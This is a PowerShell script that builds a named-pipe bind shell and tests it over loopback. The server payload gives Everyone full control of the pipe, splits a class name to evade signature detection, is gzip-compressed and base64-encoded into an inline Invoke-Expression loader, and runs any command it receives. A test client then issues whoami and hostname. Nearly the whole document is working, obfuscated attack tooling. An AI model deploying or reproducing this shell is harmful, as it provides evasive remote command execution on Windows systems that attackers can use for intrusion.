param([int]$WaitSecs = 20)
# Loopback bind shell test - runs server and client on same machine
# Proves the named pipe protocol works correctly end-to-end

$pipeName  = "LBST_" + (-join ((65..90) | Get-Random -Count 8 | % { [char]$_ }))
$endMarker = "LBTEST_" + (-join ((65..90) | Get-Random -Count 6 | % { [char]$_ }))
$bufSize   = 65536

Write-Host "[*] PipeName  : $pipeName" -ForegroundColor Cyan
Write-Host "[*] EndMarker : $endMarker" -ForegroundColor Cyan

$rawServer = @"
[void][Reflection.Assembly]::LoadWithPartialName('System.Core');
`$sec=New-Object System.IO.Pipes.PipeSecurity;
`$sid=New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0';
`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$sid,'FullControl','Allow');
`$sec.AddAccessRule(`$ar);`$sT='System.IO.Pipes.NamedPipeSer'+'verStream';
while(`$true){
    `$ps=New-Object -TypeName `$sT -ArgumentList '$pipeName','InOut',-1,'Byte','None',$bufSize,$bufSize,`$sec;
    `$rd=New-Object IO.StreamReader(`$ps);`$wr=New-Object IO.StreamWriter(`$ps);
    `$ps.WaitForConnection();
    try{`$tm=`$rd.ReadLineAsync();if(`$tm.Wait(2000)-and`$null-ne`$tm.Result){`$cmd=`$tm.Result;break}}catch{};
    `$ps.Dispose()
}
`$cb=`$true;
while(`$true){
    if(-not `$ps.IsConnected){break}
    if(`$cb){`$cb=`$false}else{`$cmd=`$rd.ReadLine()}
    if(`$cmd-eq'exit'-or`$null-eq`$cmd){break}
    try{`$r=& ([scriptblock]::Create(`$cmd)) 2>&1|Out-String;`$r-split([char]10)|%{`$wr.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split([char]10)|%{`$wr.WriteLine(`$_)}};
    `$wr.WriteLine('$endMarker');`$wr.Flush()
}
`$ps.Dispose()
"@

$bytes = [Text.Encoding]::UTF8.GetBytes($rawServer)
$ms    = [IO.MemoryStream]::new()
$gzs   = [IO.Compression.GzipStream]::new($ms, [IO.Compression.CompressionMode]::Compress)
$gzs.Write($bytes, 0, $bytes.Length); $gzs.Close()
$b64  = [Convert]::ToBase64String($ms.ToArray())
$inlinePS = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FromBase64String(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CompressionMode]::Decompress);`$c=New-Object IO.MemoryStream;`$b.CopyTo(`$c);`$d=[Text.Encoding]::UTF8.GetString(`$c.ToArray());`$b.Close();`$a.Close();`$c.Close();[scriptblock]::Create(`$d).Invoke()"

Write-Host "[+] Pipe server payload built ($($inlinePS.Length) chars)" -ForegroundColor Green

# Start pipe server in background job
Write-Host "[*] Starting pipe server in background..." -ForegroundColor Cyan
$srvJob = Start-Job -ScriptBlock { param($script) Invoke-Expression $script } -ArgumentList $inlinePS
Start-Sleep 2
Write-Host "[+] Server job started (ID: $($srvJob.Id))" -ForegroundColor Green

# Connect as client (loopback)
Write-Host "[*] Connecting client (loopback)..." -ForegroundColor Cyan
$deadline = (Get-Date).AddSeconds($WaitSecs)
$pc = $null; $connected = $false
while ((Get-Date) -lt $deadline) {
    try {
        $pc = New-Object IO.Pipes.NamedPipeClientStream('.', $pipeName, 'InOut')
        $pc.Connect(500)
        if ($pc.IsConnected) { $connected = $true; break }
    } catch {
        if ($pc) { $pc.Dispose(); $pc = $null }
        Write-Host "    [.] $([int]($deadline-(Get-Date)).TotalSeconds)s -- $($_.Exception.Message.Split('.')[0])" -ForegroundColor DarkGray
        Start-Sleep 1
    }
}

if ($connected) {
    Write-Host "" ; Write-Host "[+] CONNECTED via named pipe (loopback)!" -ForegroundColor Green
    $sr = New-Object IO.StreamReader($pc)
    $sw = New-Object IO.StreamWriter($pc)

    function Send-Cmd([string]$c) {
        $sw.WriteLine($c); $sw.Flush()
        $out = [Text.StringBuilder]::new()
        while ($true) {
            $line = $sr.ReadLine()
            if ($null -eq $line -or $line -eq $endMarker) { break }
            $out.AppendLine($line) | Out-Null
        }
        $out.ToString().TrimEnd()
    }

    Write-Host "[>] whoami: $(Send-Cmd 'whoami')" -ForegroundColor Green
    Write-Host "[>] hostname: $(Send-Cmd 'hostname')" -ForegroundColor Green
    Write-Host "[>] Get-Date: $(Send-Cmd 'Get-Date -Format yyyy-MM-dd')" -ForegroundColor Green
    Write-Host "[>] 1+1: $(Send-Cmd '1+1')" -ForegroundColor Green

    $sw.WriteLine("exit"); $sw.Flush()
    $pc.Dispose()
    Write-Host "" ; Write-Host "[+] LOOPBACK BIND SHELL TEST PASSED." -ForegroundColor Green
} else {
    Write-Host "" ; Write-Host "[-] Failed to connect to loopback pipe." -ForegroundColor Red
}

Stop-Job $srvJob -ErrorAction SilentlyContinue
Remove-Job $srvJob -ErrorAction SilentlyContinue
